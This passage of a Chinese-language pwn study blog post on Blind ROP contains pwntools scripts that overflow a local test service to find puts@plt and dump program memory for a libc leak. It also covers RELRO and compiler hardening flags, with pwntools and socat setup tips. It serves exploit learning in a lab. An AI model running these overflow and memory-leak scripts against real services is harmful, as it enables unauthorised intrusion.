+<li><p>关于<code>payload</code></p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span><br><span class="line">  addr = <span class="number">0x400000</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span>*length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_gadget)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      content = io.recv()</span><br><span class="line">      <span class="keyword">if</span> content.startswith(<span class="string">b&#x27;\x7fELF&#x27;</span>):  </span><br><span class="line">        <span class="comment"># remenber add &#x27;b&#x27; to your string</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Find puts@plt addr: 0x%x&#x27;</span> % (addr))</span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line">      io.close()</span><br><span class="line">      addr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">      io.close()</span><br><span class="line">      addr += <span class="number">1</span> </span><br></pre></td></tr></table></figure>
+
+<p>最终得到地址为<code>0x400555</code>（不同的<code>libc</code>地址是不同的）</p>
+<blockquote>
+<p>借此可以确定在泄漏<code>puts@got</code>地址后找到<code>puts</code>的真正的地址，进而泄漏<code>libc</code>的版本</p>
+</blockquote>
+<p><img src="D:\Github\pwn\pwn_study\images\brop_puts@plt.png" alt="brop_puts@plt"></p>
+<h3 id="泄漏-addr-gt-puts-got"><a href="#泄漏-addr-gt-puts-got" class="headerlink" title="泄漏 addr-&gt;puts@got"></a>泄漏 addr-&gt;puts@got</h3><blockquote>
+<ol>
+<li>泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 &#x2F; bin&#x2F;sh 地址，从而获取 shell</li>
+<li>我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了，0x1000 &#x3D; 16 bytes * 256</li>
+</ol>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_unit</span>(<span class="params">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span><br><span class="line">  io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line">  io.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">  io.sendline(payload)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    data = io.recv()</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      data = data[:data.index(<span class="string">b&#x27;\nWelCome&#x27;</span>)]</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">      data = data</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>:</span><br><span class="line">      data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  <span class="keyword">except</span> Exception:</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_memory</span>(<span class="params">length, stop_gadget, brop_gadget, rdi_ret, puts_plt, init_addr</span>):</span><br><span class="line">  result = <span class="string">&quot;&quot;</span></span><br><span class="line">  addr = init_addr</span><br><span class="line">  <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">hex</span>(addr))</span><br><span class="line">    data = leak_unit(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      result += data</span><br><span class="line">    addr += <span class="built_in">len</span>(data)</span><br><span class="line">  <span class="string">&quot;&quot;&quot; Restore the memory leaked from the exploit script &quot;&quot;&quot;</span></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure>
+
+<h2 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h2><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><ol>
+<li>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</li>
+<li>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</li>
+<li>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</li>
+</ol>
+<p><code>gcc</code>编译：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c						// 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c			// 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c				// 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o test test.c				// 全部开启，即</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="机制开-x2F-关指令总结"><a href="#机制开-x2F-关指令总结" class="headerlink" title="机制开&#x2F;关指令总结"></a>机制开&#x2F;关指令总结</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; 各种安全选择的编译参数如下:</span><br><span class="line">----------------------------------------------------------------------------------------------</span><br><span class="line">* NX：-z execstack / -z noexecstack (关闭 / 开启)</span><br><span class="line">* Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-<span class="built_in">all</span> (关闭 / 开启 / 全开启)</span><br><span class="line">* PIE：-no-pie / -pie (关闭 / 开启)</span><br><span class="line">* RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h3 id="pwntools技巧"><a href="#pwntools技巧" class="headerlink" title="pwntools技巧"></a>pwntools技巧</h3><blockquote>
+<p>直接使用</p>
+<p><code>sh = gdb.debug(&#39;./filename&#39;, &quot;break main&quot;)</code></p>
+<p>来替代</p>
+<p><code>sh = process(&#39;./filename&#39;)</code></p>
+<p>实现管道连接下的断点！！！</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload=<span class="string">b&#x27;aaaaaa&#x27;</span></span><br><span class="line">sh=gdb.debug(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;break main&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="linux技巧"><a href="#linux技巧" class="headerlink" title="linux技巧"></a>linux技巧</h3><ul>
+<li><p>报错<code>Address already in use</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -apn | grep port &lt;--端口值</span><br><span class="line">--- 查到pid</span><br><span class="line"><span class="keyword">or</span>: ps -ef | grep port</span><br><span class="line">--- 查看pid以及user</span><br><span class="line">kill -<span class="number">9</span> pid</span><br><span class="line">--- 杀死进程即可</span><br></pre></td></tr></table></figure>
+</li>
+<li></li>
+</ul>
+<h2 id="ubuntu-搭建本地服务器测试"><a href="#ubuntu-搭建本地服务器测试" class="headerlink" title="ubuntu 搭建本地服务器测试"></a>ubuntu 搭建本地服务器测试</h2><h4 id="使用socat本地搭建测试"><a href="#使用socat本地搭建测试" class="headerlink" title="使用socat本地搭建测试"></a>使用socat本地搭建测试</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">终端 <span class="number">1</span>: socat tcp-l:<span class="number">6666</span>,fork <span class="built_in">exec</span>:./文件名,reuseaddr	</span><br><span class="line">终端 <span class="number">2</span>: nc <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">6666</span>   测试</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><strong>服务器端的进程在崩溃之后会重新启动</strong>，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序<strong>最初启动</strong>的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li>
+<li>可以开两个<code>terminal</code>，然后一个作为<strong>服务器</strong>在后台运行，另一个可以脚本攻击等。</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Gan Gecen
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://ganliber.github.io/2022/06/16/pwn/brop/" title="Blind ROP">https://ganliber.github.io/2022/06/16/pwn/brop/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/stack/" rel="tag"># stack</a>
+          </div>
+
+        
+
+
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Blind-ROP"><span class="nav-number">1.</span> <span class="nav-text">Blind ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#x86%E4%B8%8Ex64%E5%9B%9E%E9%A1%BE"><span class="nav-number">1.1.</span> <span class="nav-text">x86与x64回顾</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2csu"><span class="nav-number">1.2.</span> <span class="nav-text">ret2csu</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#libc-csu-init"><span class="nav-number">1.2.1.</span> <span class="nav-text">__libc_csu_init</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90level"><span class="nav-number">1.2.2.</span> <span class="nav-text">分析level</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#payload"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99dbg%E5%9B%BE"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">报错dbg图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exploit"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">exploit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E5%AF%B9%E9%BD%90"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">栈对齐</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2reg"><span class="nav-number">1.3.</span> <span class="nav-text">ret2reg</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BROP"><span class="nav-number">1.4.</span> <span class="nav-text">BROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.4.1.</span> <span class="nav-text">攻击条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="nav-number">1.4.2.</span> <span class="nav-text">基本思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BROP-gadgets"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">BROP gadgets</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#stop-gadgets"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">stop gadgets</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%E6%A0%88%E4%B8%8A%E7%9A%84%E4%B8%89%E7%A7%8D%E5%9C%B0%E5%9D%80Probe"><span class="nav-number">1.4.2.2.1.</span> <span class="nav-text">定义栈上的三种地址Probe</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#stack-%E6%8E%A2%E6%B5%8B"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">stack 探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE-plt"><span class="nav-number">1.4.2.4.</span> <span class="nav-text">寻找 plt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6-rdx"><span class="nav-number">1.4.2.5.</span> <span class="nav-text">控制 rdx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.2.6.</span> <span class="nav-text">寻找输出函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%BB%E6%89%BEwrite-plt"><span class="nav-number">1.4.2.6.1.</span> <span class="nav-text">寻找write@plt</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%BB%E6%89%BEputs-plt"><span class="nav-number">1.4.2.6.2.</span> <span class="nav-text">寻找puts@plt</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeup-brop"><span class="nav-number">1.5.</span> <span class="nav-text">writeup_brop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E6%A0%88%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6"><span class="nav-number">1.5.1.</span> <span class="nav-text">确定栈溢出长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE-stop-gadgets"><span class="nav-number">1.5.2.</span> <span class="nav-text">寻找 stop gadgets</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE-brop-gadgets"><span class="nav-number">1.5.3.</span> <span class="nav-text">寻找 brop gadgets</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A-addr-gt-puts-plt"><span class="nav-number">1.5.4.</span> <span class="nav-text">确定 addr-&gt;puts@plt</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Method"><span class="nav-number">1.5.4.1.</span> <span class="nav-text">Method</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E6%BC%8F-addr-gt-puts-got"><span class="nav-number">1.5.5.</span> <span class="nav-text">泄漏 addr-&gt;puts@got</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="nav-number">1.6.</span> <span class="nav-text">安全机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RELRO"><span class="nav-number">1.6.1.</span> <span class="nav-text">RELRO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%BA%E5%88%B6%E5%BC%80-x2F-%E5%85%B3%E6%8C%87%E4%BB%A4%E6%80%BB%E7%BB%93"><span class="nav-number">1.6.2.</span> <span class="nav-text">机制开&#x2F;关指令总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tips"><span class="nav-number">1.7.</span> <span class="nav-text">Tips</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools%E6%8A%80%E5%B7%A7"><span class="nav-number">1.7.1.</span> <span class="nav-text">pwntools技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E6%8A%80%E5%B7%A7"><span class="nav-number">1.7.2.</span> <span class="nav-text">linux技巧</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ubuntu-%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B5%8B%E8%AF%95"><span class="nav-number">1.8.</span> <span class="nav-text">ubuntu 搭建本地服务器测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8socat%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E6%B5%8B%E8%AF%95"><span class="nav-number">1.8.0.1.</span> <span class="nav-text">使用socat本地搭建测试</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Gan Gecen"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Gan Gecen</p>
+  <div class="site-description" itemprop="description">An information security practitioner, focusing on system, Linux and pwn</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Ganliber" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Ganliber" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:Gecenliber@outlook.com" title="E-Mail → mailto:Gecenliber@outlook.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Ganliber" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Ganliber" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Gan Gecen</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+
+<div class="powered-by">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <i class="fa fa-user-md"></i>
+    <span id="busuanzi_container_site_uv">
+        访客数:<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        访问量:<span id="busuanzi_value_site_pv"></span>
+    </span>
+</div>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://Ganliber.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "https://ganliber.github.io/2022/06/16/pwn/brop/";
+    this.page.identifier = "2022/06/16/pwn/brop/";
+    this.page.title = "Blind ROP";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://Ganliber.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
